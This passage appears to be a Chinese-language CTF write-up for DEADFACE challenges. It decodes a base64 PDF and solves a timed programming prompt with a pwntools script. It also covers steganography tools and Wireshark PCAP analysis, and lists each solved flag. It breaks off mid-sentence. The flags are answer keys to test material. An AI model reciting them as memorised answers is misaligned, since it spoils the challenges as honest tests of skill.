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 bQ1lbmRvYmoNMiAwIG9iag08PC9MZW5ndGggMzIwNS9TdWJ0eXBlL1hNTC9UeXBlL01ldGFkYXRh Pj5zdHJlYW0NCjw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3pr YzlkIj8+Cjx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2Jl IFhNUCBDb3JlIDUuNi1jMDE3IDkxLjE2NDQ2NCwgMjAyMC8wNi8xNS0xMDoyMDowNSAgICAgICAg Ij4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJk Zi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAg ICAgICAgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIgogICAgICAgICAg ICB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iCiAgICAgICAgICAg IHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIgogICAgICAgICAg ICB4bWxuczpwZGY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGRmLzEuMy8iPgogICAgICAgICA8eG1w Ok1vZGlmeURhdGU+MjAyMS0wNy0xN1QyMDo1OToyNC0wNTowMDwveG1wOk1vZGlmeURhdGU+CiAg ICAgICAgIDx4bXA6Q3JlYXRlRGF0ZT4yMDIxLTA3LTE3VDIwOjU1OjIwLTA1OjAwPC94bXA6Q3Jl YXRlRGF0ZT4KICAgICAgICAgPHhtcDpNZXRhZGF0YURhdGU+MjAyMS0wNy0xN1QyMDo1OToyNC0w NTowMDwveG1wOk1ldGFkYXRhRGF0ZT4KICAgICAgICAgPHhtcDpDcmVhdG9yVG9vbD5BZG9iZSBB Y3JvYmF0IFBybyBEQyAoMzItYml0KSAyMS41LjIwMDU4PC94bXA6Q3JlYXRvclRvb2w+CiAgICAg ICAgIDxkYzpmb3JtYXQ+YXBwbGljYXRpb24vcGRmPC9kYzpmb3JtYXQ+CiAgICAgICAgIDx4bXBN TTpEb2N1bWVudElEPnV1aWQ6ODA3OGUyYWUtZDc4Yy00ZjNlLWFkZWUtMGFkM2NiMzU3ZjM1PC94 bXBNTTpEb2N1bWVudElEPgogICAgICAgICA8eG1wTU06SW5zdGFuY2VJRD51dWlkOjc1ZjNiNTNi LTZkYTgtNGNhNi1hYzZkLTVlOGU2NGY1NjMyODwveG1wTU06SW5zdGFuY2VJRD4KICAgICAgICAg PHBkZjpQcm9kdWNlcj5BZG9iZSBBY3JvYmF0IFBybyBEQyAoMzItYml0KSAyMS41LjIwMDU4PC9w ZGY6UHJvZHVjZXI+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4 bXBtZXRhPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAg ICAgCjw/eHBhY2tldCBlbmQ9InciPz4NCmVuZHN0cmVhbQ1lbmRvYmoNMyAwIG9iag08PC9GaWx0 ZXIvRmxhdGVEZWNvZGUvRmlyc3QgNC9MZW5ndGggNDkvTiAxL1R5cGUvT2JqU3RtPj5zdHJlYW0N CmjeslQwULCx0XfOL80rUTDU985MKY42NAYKBsXqh1QWpOoHJKanFtvZAQQYAOA1C68NCmVuZHN0 cmVhbQ1lbmRvYmoNNCAwIG9iag08PC9GaWx0ZXIvRmxhdGVEZWNvZGUvRmlyc3QgNS9MZW5ndGgg MTI0L04gMS9UeXBlL09ialN0bT4+c3RyZWFtDQpo3pTMsQrCMBRG4Ve5W5Oh7Z+rl6qUQmlWwQfo kjQZuvRCiO+vILg4uZ/zORBoHPul5FB3PXyo2fgbgx0GNzBEGC2kARr7qbSYOWnMNG9FY6j0KEp+ odWcuI17XS2x66RjQC62v2v6Ra98/qLvPT23/Jc6TS8BBgAluTGrDQplbmRzdHJlYW0NZW5kb2Jq DTUgMCBvYmoNPDwvRGVjb2RlUGFybXM8PC9Db2x1bW5zIDQvUHJlZGljdG9yIDEyPj4vRmlsdGVy L0ZsYXRlRGVjb2RlL0lEWzwwMkYzNTg5OTNDMUQxNDRFOENGNkQyRjJBMjc5QUM0Rj48MUVCMkZC MTkyOTFEQ0Q0RDk4Mzk3NzE1OUM5QTc1OTY+XS9JbmZvIDEwIDAgUi9MZW5ndGggNDgvUm9vdCAx MiAwIFIvU2l6ZSAxMS9UeXBlL1hSZWYvV1sxIDIgMV0+PnN0cmVhbQ0KaN5iYgACJkaFKAYmBsY7 QIL3EpBg6AVxbwIlLk4GcRkYYQTTPyDByAAQYACsTAYdDQplbmRzdHJlYW0NZW5kb2JqDXN0YXJ0 eHJlZg0KMTE2DQolJUVPRg0K 在本地解码,保存至flag.pdf ~$ base64 -d encoded &gt; flag.pdf flag:flag&#123;deM0nn3_dat4_4_us&#125; The CountApparently DEADFACE is recruiting programmers, but spookyboi is a little apprehensive about recruiting amateurs. He’s placed a password hash in the form of a flag for those able to solve his challenge. Solve the challenge and submit the flag as flag&#123;SHA256_hash&#125;. Link to Thread code.deadface.io:50000 使用nc命令连接服务器 ╭─ ~/CTF/DEADFACE ╰─$ nc code.deadface.io 50000 DEADFACE gatekeeper: Let us see how good your programming skills are. If a = 0, b = 1, c = 2, etc.. Tell me what the sum of this word is: You have 5 seconds to give me an answer. Your word is: tightfisted Too slow!! Word has been reset! 我们取每一位字符的ASCII码后减去97,求和即可 from pwn import * p = remote(&#39;code.deadface.io&#39;, 50000) x = p.recvline_contains(b&#39;Your word&#39;) word = x.decode().rsplit(&#39;:&#39;)[-1].strip() count = sum([ord(x)-97 for x in word]) p.send(str(count).encode()) print(p.recvline()) print(p.recvline()) print(p.recvline()) flag:flag&#123;d1c037808d23acd0dc0e3b897f344571ddce4b294e742b434888b3d9f69d9944&#125; Behind the CurtainThis image was intercepted from Ghost Town. We think Donnell has hidden information here, but there doesn’t seem to be anything special about the image. Can you help find the hidden information? Submit the flag as flag{this-is-the-flag}. Link to Image SHA1: 29141eea42be29f8fa28a9a1cc5e5118e63577b2 使用Stegsolve打开图片,选择Frame Browser,在Frame 2即可看到flag flag:flag&#123;L3t_m3_in&#125; Scary BunnyWhat could be inside this creepy rabbit? Download image SHA1: 7ab2d9b1986ae12b780d0a2124a3adce6ed4c4e1 使用steghide info查看图片隐写信息 ╭─ ~/CTF/DEADFACE ╰─$ steghide info bunny.jpg &quot;bunny.jpg&quot;: format: jpeg capacity: 2.7 KB Try to get information about embedded data ? (y/n) y Enter passphrase: embedded file &quot;steganopayload730241.txt&quot;: size: 13.0 Byte encrypted: rijndael-128, cbc compressed: yes 使用steghide extract提取隐写的文件steganopayload730241.txt ╭─ ~/CTF/DEADFACE ╰─$ steghide extract -sf bunny.jpg Enter passphrase: the file &quot;steganopayload730241.txt&quot; does already exist. overwrite ? (y/n) y wrote extracted data to &quot;steganopayload730241.txt&quot;. ╭─ ~/CTF/DEADFACE ╰─$ cat steganopayload730241.txt flag&#123;Carr0t&#125; flag:flag&#123;Carr0t&#125; Send in the ClownsThere is a secret hidden somewhere in this image. Can you find it? Submit the flag as flag{this-is-the-flag}. Link to ImageSHA1: 74eaae618bf508ef2715533bfdff3153dd996e89 ╭─ ~/CTF/DEADFACE ╰─$ strings steg02.jpg |grep flag flag&#123;s3nd_in_the_kl0wns&#125; flag:flag&#123;s3nd_in_the_kl0wns&#125; V0icEA friend of mine sent me an audio file which supposes to tell me the time of our night out meeting, but I can’t comprehend the voice in the audio file. Can you help me figure it out? I want to hang out with my friends. Download file SHA1:3173700e9ba2f062a18707b375fac61049310413 用Sonic Visualiser打开midnight.wav,点击Layer-&gt;Add Spectrogram-&gt;midnight.wav: All Channels Mixed 放大后即可看到隐藏在频谱图的flag flag:flag&#123;1257&#125; A WarningLuciafer is being watched! Someone on the inside of Lytton Labs can see what she is doing and is sending her a message. One of them says: “Stay away from Lytton Labs… you have been warned.” To find the flag, find the message. You’ll know it when you see it. Submit the flag as flag&#123;flag-goes-here&#125;. Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina. 使用Wireshark打开pcap-challenge-final.pcapng文件,搜索“warning”,找到一个请求da-warning-message.jpg的HTTP请求 找到该请求对应响应的数据包(16050),对着”JPEG File Interchange Format”右键,选择”显示分组字节”,即可看到flag flag:flag&#123;angels-fear-to-tread&#125; Monster from the MachineOur person on the “inside” of Ghost Town was able to plant a packet sniffing device on Luciafer’s computer. Based on our initial analysis, we know that she was attempting to hack a computer in Lytton Labs, and we have some idea of what she was doing, but we need a more in-depth analysis. This is where YOU come in. We need YOU to help us analyze the packet capture. Look for relevant data to the potential attempted hack. To gather some information on the victim, investigate the victim’s computer activity. The “victim” was using a search engine to look up a name. Provide the name with standard capitalization: flag&#123;Jerry Seinfeld&#125;. Download file SHA1: 6c0caf366dae3e03bcbd7338de0030812536894c 使用Wireshark打开pcap-challenge-final.pcapng文件,按照HTTP过滤 右键,点击”跟踪流”-&gt;”HTTP流” flag:flag&#123;Charles Geschickter&#125; Release the Crackin’!Luciafer cracked a password belonging to the victim. Submit the flag as: flag&#123;password&#125;. Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina. 使用Wireshark打开pcap-challenge-final.pcapng文件,搜索logged,找到正确的密码 flag:flag&#123;darkangel&#125; The SUM of All FEARSAfter hacking a victim’s computer, Luciafer downloaded several files, including two binaries with identical names, but with the extensions 